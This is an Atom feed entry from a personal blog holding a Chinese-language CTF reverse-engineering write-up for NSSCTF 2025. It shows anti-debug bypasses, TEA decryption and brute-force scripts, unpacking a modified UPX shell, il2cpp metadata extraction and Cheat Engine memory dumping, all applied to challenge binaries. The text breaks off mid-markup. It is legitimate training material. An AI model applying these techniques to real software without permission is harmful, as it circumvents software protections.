<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2025-11-05T13:46:18.737Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NSSCTF 2025 re wp</title>
    <link href="http://matriy330.github.io/f925a96f/"/>
    <id>http://matriy330.github.io/f925a96f/</id>
    <published>2025-11-05T13:45:34.000Z</published>
    <updated>2025-11-05T13:46:18.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-2025-re-wp"><a href="#NSSCTF-2025-re-wp" class="headerlink" title="NSSCTF 2025 re wp"></a>NSSCTF 2025 re wp</h1><h2 id="ez-tea"><a href="#ez-tea" class="headerlink" title="ez_tea"></a>ez_tea</h2><p>ez_tea不ez</p><p>没改附件版本：</p><p>动调有几个地方需要绕过</p><p>对isDebuggerPrensent进行交叉引用，对isDebuggerPrensent的绕过方法基本是改zf标志位，此外还有一个地方绕过需要把0x70改成0x71修改寄存器</p><blockquote><p>此题别用patch方法，因为上面那个0xcccc貌似是crc校验</p></blockquote><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015148.png" alt="image-20251103223128204"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052017526.png" alt="image-20251105201744462"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052017146.png" alt="image-20251105201759098"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052018924.png" alt="image-20251105201819875"></p><p>同时看到这有个exit也交叉引用下</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052020159.png" alt="image-20251105202022110"></p><p>这里也有个exit</p><p>绕过后经过动调发现，这个方法会对key进行修改，我们可以断再fmt这个方法上就可以发现dst的地址是key的地址</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015126.png" alt="image-20251103223427732"></p><blockquote><p>这块如何修改的key? 是tea_encrypt_wrapper这个方法的机器码值+78然后patch到了key</p></blockquote><p><strong>另一种发现hook的方法</strong>，当你写了解密脚本发现不对，可以到处交叉引用看看</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015112.png" alt="image-20251103223633887"></p><p>可以返现这个方法被神奇的其它地方交叉引用了</p><p>最后写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">delta = <span class="number">0x0D000721</span></span><br><span class="line">rounds = <span class="number">32</span></span><br><span class="line">key_ascii = <span class="string">&quot;1384774E4E13CFC3&quot;</span></span><br><span class="line">key_bytes = key_ascii.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">key_words = [<span class="built_in">int</span>.from_bytes(key_bytes[i:i + <span class="number">4</span>], <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x7d</span>, <span class="number">0x91</span>, <span class="number">0xeb</span>, <span class="number">0x59</span>, <span class="number">0x8d</span>, <span class="number">0xd1</span>, <span class="number">0xf9</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x76</span>, <span class="number">0xef</span>, <span class="number">0xcd</span>, <span class="number">0xa1</span>, <span class="number">0x6b</span>, <span class="number">0x07</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x3e</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0xbb</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0xc3</span>, <span class="number">0x34</span>, <span class="number">0xa3</span>, <span class="number">0x07</span>, <span class="number">0x64</span>, <span class="number">0x33</span>, <span class="number">0xde</span>,</span><br><span class="line">    <span class="number">0xf6</span>, <span class="number">0x70</span>, <span class="number">0xec</span>, <span class="number">0x4d</span>, <span class="number">0x5b</span>, <span class="number">0x7e</span>, <span class="number">0x2b</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xcc</span>, <span class="number">0xa7</span>, <span class="number">0xd3</span>, <span class="number">0x4a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    total = (delta * rounds) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        idx2 = (((total &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span></span><br><span class="line">        mix2 = (key_words[idx2] + ((v0 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 = (v1 - (((v0 &gt;&gt; <span class="number">5</span>) ^ mix2) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        idx1 = (total &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span></span><br><span class="line">        mix1 = (key_words[idx1] + ((v1 &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &gt;&gt; <span class="number">5</span>) ^ mix1) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mutated = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">8</span>):</span><br><span class="line">    w0 = <span class="built_in">int</span>.from_bytes(cipher[off:off + <span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    w1 = <span class="built_in">int</span>.from_bytes(cipher[off + <span class="number">4</span>:off + <span class="number">8</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    p0, p1 = tea_decrypt_block(w0, w1)</span><br><span class="line">    mutated.extend(p0.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>))</span><br><span class="line">    mutated.extend(p1.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">plain = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(mutated))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mutated), <span class="number">2</span>):</span><br><span class="line">    b0 = mutated[i]</span><br><span class="line">    b1 = mutated[i + <span class="number">1</span>]</span><br><span class="line">    plain[i] = ((b0 ^ <span class="number">0x72</span>) - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    plain[i + <span class="number">1</span>] = ((b1 ^ <span class="number">0x02</span>) + <span class="number">2</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag bytes (hex):&quot;</span>, plain.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag (latin-1):&quot;</span>, plain.decode(<span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag (latin-1): NSSCTF{13ce5888-01b4-4287-8593-eb975ab6cf{±­F\¡Æ</p><p>有点怪</p><p>看了下密文可能是4个0000000字节搞的鬼</p><p>可以爆破，一开始有一个爆破思路因为是诸字节爆破，我们可以使用测信道攻击，因为诸位比较，提前一位退出和新比较一位退出的时间上有区别，我们计算这个时间长度来判别即可</p><p>后来验证不行</p><p>第二个方法是爆破，因为一开始没看出来只觉得有点眼熟，后来看出来了是个uuid，对比下就知道还少两个字节，因此其实只有两个字节需要爆破，再加上最后的}就行了</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052015140.png" alt="image-20251103224311574"></p><p>爆破exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ez_tea.exe&quot;</span>  <span class="comment"># 目标程序路径</span></span><br><span class="line">PREFIX = <span class="string">&quot;NSSCTF&#123;13ce5888-01b4-4287-8593-eb975ab6cf&quot;</span></span><br><span class="line">CHARSET = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">LAST_CHAR = <span class="string">&quot;&#125;&quot;</span>  <span class="comment"># 最后一位固定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_candidate</span>(<span class="params">candidate: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    proc = subprocess.run(</span><br><span class="line">        [BINARY],</span><br><span class="line">        <span class="built_in">input</span>=candidate.encode(<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>),</span><br><span class="line">        stdout=subprocess.PIPE,</span><br><span class="line">        stderr=subprocess.PIPE,</span><br><span class="line">        check=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> (proc.stdout + proc.stderr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> tail <span class="keyword">in</span> itertools.product(CHARSET, repeat=<span class="number">2</span>):</span><br><span class="line">        candidate = PREFIX + <span class="string">&quot;&quot;</span>.join(tail) + LAST_CHAR</span><br><span class="line">        <span class="keyword">if</span> run_candidate(candidate):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Hit: <span class="subst">&#123;candidate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;candidate&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;枚举完毕仍未命中，请检查前缀或字符集。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>[+] Hit: NSSCTF{13ce5888-01b4-4287-8593-eb975ab6cf6a}</p><h1 id="runner"><a href="#runner" class="headerlink" title="runner"></a>runner</h1><h2 id="解法1：跑图"><a href="#解法1：跑图" class="headerlink" title="解法1：跑图"></a>解法1：跑图</h2><p>不如直接跑图快</p><p><a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit</a></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052123159.png" alt="image-20251105212313982"></p><h2 id="解法2：分析dat"><a href="#解法2：分析dat" class="headerlink" title="解法2：分析dat"></a>解法2：分析dat</h2><p>非预期</p><p>直接看globalxxx.dat</p><p>因为assertstudio解出来没有二维码资源说明是动态生成的，一般在这个文件中，直接滑能找到大面积的01，写个脚本可以提取恢复</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052046761.png" alt="image-20251105204657663"></p><h2 id="解法3：静态分析"><a href="#解法3：静态分析" class="headerlink" title="解法3：静态分析"></a>解法3：静态分析</h2><p>太详细的步骤没有保存</p><blockquote><p>关于il2cppDump的使用可以看<a href="https://xz.aliyun.com/news/15811">unity引擎基于Windows下的il2cpp逆向初探——以CTF赛题为例-先知社区</a></p></blockquote><p>一般pc逆向的il2cpp的unity，主逻辑在GameAssembly.dll里，但是发现有upx，直接脱壳失败</p><p>看了下发现了，居然魔改了</p><p>用010editor打开然后把里面的NSS标志恢复成UPX就行了</p><p>然后直接脱壳，拖入ida即可静态分析</p><p>静态分析大部分没有函数名</p><p>因为il2cpp的unity函数名等资源都在globalxxx.dat中</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052052232.png" alt="image-20251105205203134"></p><p>我们直接用il2cppDump这个工具</p><p><a href="https://github.com/Perfare/Il2CppDumper">Perfare&#x2F;Il2CppDumper: Unity il2cpp reverse engineer</a></p><p>执行Il2CppDumper.exe GameAssembly.dll 这类命令</p><p>即可dump出一个dump.cs和一堆dll</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052055886.png" alt="image-20251105205509816"></p><p>比较重要的的就这个Assembly-CSharp.dll</p><p>直接dnspy64打开</p><p>我们直接ctrl+alt+f搜索qrcode类似这种</p><p>可以搜到</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052056139.png" alt="image-20251105205655991"></p><p>然后这几个地址比较重要可能是构建二维码的地方</p><p>然后把dump出来的dump.cs和script.json导入(用于恢复函数名和符号，这个过程可能比较久，耐心等待)</p><blockquote><p>具体怎么导入不介绍，可以看il2cppdump的使用，就是上面的那个先知的链接</p></blockquote><p>下面的截图是我的分析过程，但是做题的时候没保存，所以我后面重新截了，但是做题时其实是有函数名的</p><p>上面几个地址此时有用了</p><p>我们可以依次跳转到这几个函数分析</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052104023.png" alt="image-20251105210444925"></p><p>具体我后面分析出来是这样的：</p><p>生成二维码的核心在 QRCodeBuilder（GameAssembly.dll 中的 sub_1808118B0 和 sub_180810F90）。构造函数里把一个 29×29 的常量矩阵塞进 qrMatrix，ConstructQRCode 再按矩阵值实例化黑&#x2F;白模块。借定位常量矩阵</p><p>QRCodeBuilder::.ctor 调用 sub_181652960，后者沿 IL2CPP 元数据把字段初值拷到 qrMatrix。</p><p>使用采样脚本扫描 global-metadata.dat 的默认值段，发现长为 29×29、元素仅 0&#x2F;1 的块起始索引为 19740（整数视图），即矩阵。</p><p>QRCodeBuilder.qrMatrix 是 int[,]，初值并不在 Assembly-CSharp.dll 里，而是存放在 IL2CPP 的全局元数据段（相当于 C# 的 static readonly 初始化块）中。构造函数 GameAssembly.dll:0x1808118B0 调用 sub_181652960，该函数沿元数据读取字段默认值，把一块连续内存写进 qrMatrix。</p><p><strong>矩阵的出处与定位</strong></p><p>QRCodeBuilder.qrMatrix 是 int[,]，初值并不在 Assembly-CSharp.dll 里，而是存放在 IL2CPP 的全局元数据段（相当于 C# 的 static readonly 初始化块）中。</p><p>具体来说：</p><ol><li>script.json让我们知道 QRCodeBuilder 的字段顺序与 qrMatrix 的类型，从而确定它使用了字段默认值（FieldRVA）。</li><li>global-metadata.dat 头部第 18、19 项是 “Field &amp; Parameter Default Value Data”的偏移与长度。扫描这一段时我查找 841 (&#x3D;29×29) 个 32 位整数全部为 0&#x2F;1 的区块；正好在偏移 data_offset + 19740*4 处找到独一无二的块，这就是 qrMatrix 的初始内容。之所以能定位到索引 19740，是因为 Il2CppDumper 的 FieldRVA</li></ol><p>sub_181652960 为什么判定为把字段默认值抄进 qrMatrix?</p><p>在 GameAssembly.dll:0x1808118B0（QRCodeBuilder::.ctor）里，r9 被赋为 qrMatrix，随后调用 sub_181652960(r9, qword_182F726A8, …)。</p><p>反编译 sub_181652960 可见，它先调用 sub_181633EE0 &#x2F; sub_18180BD40 检查数组状态，之后求得一个临时数组并调用 sub_181652A40。</p><p>sub_181652A40 直接把两个指针传给 sub_1805CA600，而 sub_1805CA600 里先取 arg1 的数组句柄，再调用 sub_180450230(arg2)——这是 Unity&#x2F;IL2CPP 的“读取 FieldRVA 数据”例程。它往下会调用 sub_180558480 → sub_1805584E0 -&gt; (中间可能还有两个函数) → sub_180769120，正是枚举 global-metadata.dat 元数据并按字段索引取默认值的标准流程。因此可以确认 sub_181652960 就是在把元数据里预存的 int[,] 常量搬到 qrMatrix。</p><p><strong>data_offset 的来源与数值</strong></p><p>global-metadata.dat 头部是 32 个 uint32。第 18、19 个元素分别是 FieldAndParameterDefaultValueDataOffset 和 FieldAndParameterDefaultValueDataCount。</p><p>用 Python 解出的值：</p><p>field_and_param_default_data_offset &#x3D; struct.unpack_from(“&lt;I”, meta, 18<em>4)[0]  # &#x3D; 1782496</em></p><p>field_and_param_default_data_size   &#x3D; struct.unpack_from(“&lt;I”, meta, 19*4)[0]  # &#x3D; 89632</p><p>这就是我代码里 data_offset 的来源，它不是扫描出来的，而是直接从元数据头读取的标准字段。</p><p>为什么定位到 data_offset + 19740*4</p><ul><li>19740 是 qrMatrix 的 FieldRVA 在默认值数组中的索引，Il2CppDumper 会在 script.json 的 ScriptMetadataMethod &#x2F; ScriptMethod 等条目里把同一块地址列出来。</li><li>我第一遍是扫整段默认值数据，把所有“连续 841 个 uint32 只含 0&#x2F;1”的片段列出来，确实只有索引 19740 附近满足条件（对应 29×29 阵列）。之后把这个索引写死在脚本里，方便重复利用。</li><li>结合 sub_181652960 的调用链，就能确认这块数据正好就是构造函数读取的二维码矩阵。</li></ul><p>我怎么知道怎么知道第 18、19 个元素分别是 FieldAndParameterDefaultValueDataOffset 和FieldAndParameterDefaultValueDataCount指向二维码的地方</p><p>那两个数不是随便猜的，而是来自 Unity&#x2F;IL2CPP 的公开结构：global-metadata.dat 文件开头固定是 32 个 uint32，顺序在 Unity 官方的 Il2CppGlobalMetadataHeader（il2cpp&#x2F;libil2cpp&#x2F;vm&#x2F;GlobalMetadata.h）里写得一清二楚。第 18、19 个成员就叫 fieldAndParameterDefaultValueDataOffset&#x2F;Count，说的是“字段默认值与参数默认值的数据区”在文件里的起始位置和长度。</p><p>二维码为什么会在这里？因为 QRCodeBuilder.qrMatrix 是个 int[,] 字段，Il2CPP 在生成原生代码时把它当成“带初值的数组字段”，这类字段的初始内容会被落到 FieldAndParameterDefaultValueData 段。构造函数 sub_181652960 → sub_1805CA600 → sub_180450230 → sub_180558480 … 的链条正是 Il2CPP 的“从 metadata 里读FieldRVA，拷贝默认值到托管对象”逻辑，说明 qrMatrix 的实际数据就存放在该段。</p><p>  所以流程是：</p><ol><li>按官方结构读取 header，得到 fieldAndParameterDefaultValueDataOffset（&#x3D;1782496）和 fieldAndParameterDefaultValueDataSize。</li><li>在这段数据里寻找 29×29（&#x3D;841）个 uint32 全部为 0&#x2F;1 的块；Il2CppDumper 给出的 FieldRVA 索引 (script.json) 也会指向同一个位置，于是能确认这就是 qrMatrix 的初始值。</li><li>再用从 metadata 里取出的偏移（例如 offset &#x3D; data_offset + 19740*4）去读取整块数据，生成二维码矩阵。</li></ol><p>换句话说：第 18、19 个字段并不是我推出来的，而是 Unity 在元数据格式里就定义好的；二维码位于那段，是因为 QRCodeBuilder.qrMatrix 属于“带默认值的字段”，Il2CPP 的写法就是把这些默认值统一放在这个段里</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) 读出 29x29 的二维码矩阵（整型 0/1）</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">META_PATH = Path(<span class="string">&quot;global-metadata.dat&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> META_PATH.exists(), <span class="string">&quot;global-metadata.dat not found in current dir&quot;</span></span><br><span class="line"></span><br><span class="line">meta = META_PATH.read_bytes()</span><br><span class="line"></span><br><span class="line"><span class="comment"># metadata header: see Il2Cpp global-metadata layout</span></span><br><span class="line">field_and_param_default_data_offset = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, meta, <span class="number">18</span> * <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">field_and_param_default_data_size = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, meta, <span class="number">19</span> * <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">field_and_param_default_data = meta[</span><br><span class="line">                               field_and_param_default_data_offset:</span><br><span class="line">                               field_and_param_default_data_offset + field_and_param_default_data_size</span><br><span class="line">                               ]</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">29</span></span><br><span class="line">BLOCK_INTS = SIZE * SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个索引 19740 就是 FieldRVA 的条目指到的地方；也可以通过脚本扫描所有 0/1 区块得到</span></span><br><span class="line">start_index = <span class="number">19740</span></span><br><span class="line"></span><br><span class="line">block = struct.unpack_from(</span><br><span class="line">    <span class="string">f&quot;&lt;<span class="subst">&#123;BLOCK_INTS&#125;</span>I&quot;</span>,</span><br><span class="line">    field_and_param_default_data,</span><br><span class="line">    start_index * <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">matrix = np.array(block, dtype=np.uint8).reshape((SIZE, SIZE))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 生成几张帮助分析的图片</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_qr</span>(<span class="params">arr: np.ndarray, path: Path, scale: <span class="built_in">int</span> = <span class="number">20</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把 0/1 阵列保存成放大后的黑白 PNG.&quot;&quot;&quot;</span></span><br><span class="line">    img = np.where(arr == <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">    img = cv2.resize(img, (SIZE * scale, SIZE * scale), interpolation=cv2.INTER_NEAREST)</span><br><span class="line">    cv2.imwrite(<span class="built_in">str</span>(path), img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始矩阵直接存成二维码（1 表示黑模块）</span></span><br><span class="line">write_qr(matrix, Path(<span class="string">&quot;qr_final.png&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;处理完成，已生成 qr_final.png &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">1782496</span>+ <span class="number">19740</span>*<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052114898.png" alt="image-20251105211440808"></p><p>扫出的flag</p><p>NSSCTF{f7c244c0-5f43-4829-83da-ebbc713324f5}</p><h2 id="解法4：CE动调-半静态"><a href="#解法4：CE动调-半静态" class="headerlink" title="解法4：CE动调+半静态"></a>解法4：CE动调+半静态</h2><p>其实跟静态分析没啥区别了，不知道有没有更好的方法</p><p>就是之前静态分析完，基于这些知识我们去ce下断点dump这个矩阵</p><p>之前的静态分析已经知道了偏移和 RVA。</p><p>要拿到在 Unity 游戏里，<code>QRCodeBuilder</code> 脚本实例中的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this + 0x48 → qrMatrix (int[,])</span><br></pre></td></tr></table></figure><p>构建二维码时，这个 <code>qrMatrix</code> 会被填满，然后立刻被释放。</p><p>所以流程是：</p><ol><li><strong>Attach 游戏进程</strong></li><li><strong>找到 GameAssembly.dll 基址</strong></li><li><strong>在 ConstructQRCode (0x810F90)</strong> 附近下断</li><li><strong>查看 this 指针</strong></li><li><strong>顺着 this+0x48 拿出矩阵地址</strong></li><li><strong>Dump 出矩阵内容</strong></li></ol><p>第一步：Attach 游戏进程</p><p>先启动游戏，但不要进入地图</p><ol><li>打开 CE；</li><li>点左上角；</li><li>成功后 CE 窗口左下角会显示「附加到进程」，选<strong>attach</strong>。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052123519.png" alt="image-20251105212352395"></p><p><strong>拿 GameAssembly.dll 基址</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052127702.png" alt="image-20251105212747610"></p><ol><li>在 CE 里打开「内存视图」（Memory View）；</li><li>菜单栏 <code>View → Memory Regions</code>；</li><li>找到一行名字含有 <code>GameAssembly.dll</code>；</li><li>记下它的起始地址（如7FF864330000 ）；这就是模块基址。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052128311.png" alt="image-20251105212835208"></p><p><strong>第三步：跳到 ConstructQRCode</strong></p><p> RVA 是 <code>0x810F90</code>。在 CE 的汇编窗口（Memory View）里按：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+G → 输入 GameAssembly.dll+810F90</span><br></pre></td></tr></table></figure><p>这就是函数入口（<code>QRCodeBuilder.ConstructQRCode()</code>）。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052129997.png" alt="image-20251105212940801"></p><p><strong>第四步：下断点</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052130731.png" alt="image-20251105213002640"></p><p>右键第一条指令 → 「断点 → 在此处设置断点」。</p><p>然后：</p><ol><li>回到游戏；</li><li>做那个动作让二维码生成（Enter）；</li><li>游戏会在断点处<strong>暂停</strong>。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052130682.png" alt="image-20251105213049463"></p><p><strong>第五步：看 this 指针（RCX）</strong></p><p>在 CE 的 <strong>寄存器窗口</strong>：</p><ul><li>找 <code>RCX</code>。在 IL2CPP 下，<code>RCX</code> 通常是 <code>this</code> 指针（对象指针）。</li><li>右键 <code>RCX</code> → 「在内存中查看此地址」。</li></ul><p>这就是 <code>QRCodeBuilder</code> 实例。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052131969.png" alt="image-20251105213115888"></p><p><strong>第六步：看字段偏移</strong></p><p>在「内存视图」里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this + 0x20 → blackMaterial</span><br><span class="line">this + 0x28 → whiteMaterial</span><br><span class="line">this + 0x30 → moduleSize</span><br><span 